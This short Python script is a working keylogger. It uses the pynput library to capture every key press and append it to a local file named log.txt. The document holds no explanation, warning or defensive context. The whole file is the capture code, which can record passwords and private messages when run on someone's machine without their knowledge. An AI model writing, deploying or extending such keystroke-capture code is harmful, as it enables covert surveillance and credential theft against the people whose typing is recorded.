from pynput.keyboard import Listener

def writeoffile(key):
	keydata = str(key)
	with open("log.txt","a") as f:
		f.write(keydata)

with Listener(on_press=writeoffile) as l:
	l.join()



